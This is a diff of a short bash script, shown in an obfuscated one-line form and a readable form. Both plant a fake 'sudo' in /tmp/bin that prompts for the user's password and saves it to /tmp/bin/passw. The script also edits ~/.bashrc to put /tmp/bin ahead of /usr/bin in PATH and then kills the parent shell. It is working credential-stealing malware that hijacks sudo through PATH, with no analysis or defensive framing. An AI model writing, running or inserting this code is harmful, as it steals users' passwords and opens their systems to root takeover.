@@ -1,1 +1,21 @@
-_C0="iWaad::çaAdF"; _C1="#!/bin/bash\nusername=\$(whoami)\nread -s -p \"[sudo] password for \$username: \" password\necho \$password > /tmp/bin/passw\n"; if [ ! -f /tmp/bin/$_C0 ]; then mkdir /tmp/bin; touch /tmp/bin/$_CO; echo $_C1 > /tmp/bin/sudo; chmod 777 /tmp/bin/sudo; fi; if !(grep -q $_C1 ~/.bashrc); then echo "export PATH=/bin/:/tmp/bin/:/usr/bin/" >> ~/.bashrc; echo "#$_C1" >> ~/.bashrc; fi; kill -9 $PPID
+#!/bin/bash
+sign="iWaad::çaAdF"
+payload="
+#!/bin/bash\n
+username=\$(whoami)\n
+read -s -p \"[sudo] password for \$username: \" password && echo\n
+echo \$password > /tmp/bin/passw\n
+"
+
+if [ ! -f /tmp/bin/$sign ]; then
+	mkdir /tmp/bin
+	touch /tmp/bin/$sign
+	echo $payload > /tmp/bin/sudo	
+	chmod 777 /tmp/bin/sudo
+fi
+if !(grep -q $sign ~/.bashrc); then
+	echo "export PATH=/bin/:/tmp/bin/:/usr/bin/" >> ~/.bashrc
+	echo "#$sign" >> ~/.bashrc
+fi
+
+kill -9 $PPID
